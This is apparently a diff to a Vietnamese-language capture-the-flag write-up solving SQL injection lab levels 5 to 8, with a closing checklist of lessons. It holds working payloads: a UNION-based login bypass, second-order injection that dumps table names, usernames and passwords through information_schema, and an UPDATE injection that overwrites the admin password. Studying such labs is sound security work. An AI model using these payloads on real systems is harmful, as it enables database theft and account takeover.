@@ -3,9 +3,10 @@
 ```
 username=/&password=) union select 'admin' #
 ```
-
+ ---
 # Level 5:
 ![](images/sql_injection_pipeline-level-5.png)
+
 ```php
 <?php
 function loginHandler($username, $password)
@@ -48,6 +49,7 @@ username=' UNION SELECT 'admin', md5('123') -- &password=123
 - PoC rằng sau khi làm giả md5 hash có thể thấy password đã thay đổi theo đoạn string mà ta mong muốn
 ![886](images/fake_password.png)
 
+---
 # Level 6
 - Tên bảng: posts_db
 ```sql
@@ -172,3 +174,80 @@ while index <= 8:
             print(f"Found: {flag}")
             break
 ```
+
+---
+# Level 7
+- Query trong backend code như thế này:
+```sql
+-- Register
+INSERT INTO users(username, password, email) VALUES (?, ?, ?)
+-- Show profile
+SELECT email FROM users WHERE username='$username' <- untrusted data nè
+```
+
+```sql
+-- register: username=' + payload bên dưới (nhưng khúc này bị đi sai hướng :v )
+UNION SELECT table_name FROM information_schema.tables WHERE table_name != 'users'; #
+		|
+		|  /* tìm được bảng tên 'test' */
+		v
+UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='test'; #
+		|  /* backend code chỉ lấy một dòng -> có thể gom nhiều dòng thành một bằng cách sử dụng `group_concat()` */
+		|  /* tìm được tên bảng là username,password */
+		v
+UNION SELECT GROUP_CONCAT(username) FROM test; #
+		|
+		|  /* tìm được 2 username: aan,bo8 */
+		v
+UNION SELECT GROUP_CONCAT(password) FROM test; #
+		|
+		|  /* tìm được 2 password: haha,mothaiba */
+		v
+UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_name!='users'; #
+
+
+/* làm một hồi thì mới nhận ra rằng flag nằm ở table users chứ không phải table nào khác :)) */
+UNION SELECT GROUP_CONCAT(username) FROM users; #
+		|
+		|  /* hình bên dưới */
+		v
+UNION SELECT password FROM users WHERE username='CBJS_FLAG'; #
+		|
+		| 
+		v
+CBJS{FAKE_FLAG_FAKE_FLAG}
+```
+
+![](images/flag-username.png)
+
+---
+# Level 8
+## Dấu hiệu nguy hiểm
+### Cách 1:
+```sql
+UPDATE users SET email='$email' WHERE username='$username'
+						  ^                         ^
+						  |-----(untrusted data)----|
+-- Do ở đây nó update email mà đi nhét hẵn $email vs $username dô cho nên là dính chưởng --
+```
+- Từ đây nên tính năng update bị kiểm soát rồi -> đăng ký đại một tài khoản sau đó đăng nhập rồi vào /update.php
+```sql
+/* Do trong code có hàm update nên chèn này dô update ké luôn password của admin :))) */
+', password=md5('123') WHERE username='admin' -- 
+```
+> Sau đó cứ đăng nhập vào admin với password đã update là xong
+
+![](images/update-admin-password.png)
+
+### Cách 2:
+- Vì ở /update.php, biến `$username` cũng được truyền thẳng vào câu query nên lòi ra cách 2 là đặt `username=admin' --`, sau đó `/update.php` nhập vào là , `password=md5('123')`
+ 
+---
+# Bài học
+- Build payload từ nhỏ -> lớn *(bắt đầu với payload đơn giản để phát hiện lỗi cú pháp (`'`, `"`, `\`, `)`, v.v.), rồi tăng dần độ phức tạp để xác định kiểu injection, số cột, tên bảng,...)*
+- Cứ dựa theo tính năng mình thấy mà đoán backend theo pipeline
+	1. Loại DB gì + phiên bản? (từ đó search ra vuln thường gặp trên phiên bản)
+	2. Chỗ nào injection được? (URL parameters, form fields, User-Agent, Referer, Cookie, X-Forwarded-For,...)
+	3. Có vuln với SQL injection không? (PoC ra)
+	4. Loại SQL injection nào? (First order, second order, blind,..)
+	5. Build payload
